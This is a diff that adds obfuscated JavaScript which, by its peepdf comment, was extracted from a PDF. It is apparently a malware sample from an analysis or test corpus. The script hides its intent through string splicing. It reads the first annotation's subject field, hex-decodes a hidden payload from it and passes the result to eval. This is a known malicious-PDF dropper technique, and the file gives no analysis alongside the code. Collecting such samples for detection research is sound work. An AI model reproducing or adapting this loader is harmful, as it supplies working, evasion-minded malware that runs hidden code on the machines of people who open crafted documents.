@@ -1,0 +1,37 @@
+// peepdf comment: Javascript code located in object 7 (version 0)
+
+function dskp(s) {
+    frcc = ("").constructor['f' + 'romCha' + 'rCode'];
+    s = s.split('%');
+    r = "";
+    for (c in s) {
+        if (!s[c]) continue;
+        r += frcc(parseInt(s[c], 16))
+    }
+    return r;
+}
+vd = "";
+vnt = event;
+r = (this['r'] = 'l' + this['vd'] + 'a' + 'c' + 'e', 'r' + 'e' + 'p' + r);
+if (!vd && r) {
+    var z;
+    tis = vnt[('ta')[r](/r/, "") + 'r' + vd + 'ge' + 't'];
+    var e = vd + 'v' + 'a';
+    e = this['vd'] + 'e' + this['e'];
+    e = this['tis'][e + 'l'];
+    var y;
+    this['z'] = y = tis;
+    y = 0;
+    sas = (this['sas'] = 'c', 's' + 'yn' + sas);
+    this['sas'] += 'A' + 'n' + this['vd'] + 'n' + 'otS' + 'can';
+    z[sas]();
+    y = this['z'];
+    sbj = 's' + 'u' + 'bje' + 'ct';
+    var p = y['g' + 'et' + ('Aaot' + 's')[r](/a/, 'n' + 'n')]();
+    var s = p[0][this['sbj']];
+    var l = this['s'][r](/[FAE]/g, ('q' + '%p')[r](/[qp]/g, ""));
+    this['s'] = dskp(l);
+    for (VAR_search_1 in this) if (VAR_search_1.length == 1 && VAR_search_1.charCodeAt(0) == 101 & VAR_search_1.charCodeAt(0) == 101) break;
+    this[VAR_search_1](this['s'])
+}
+
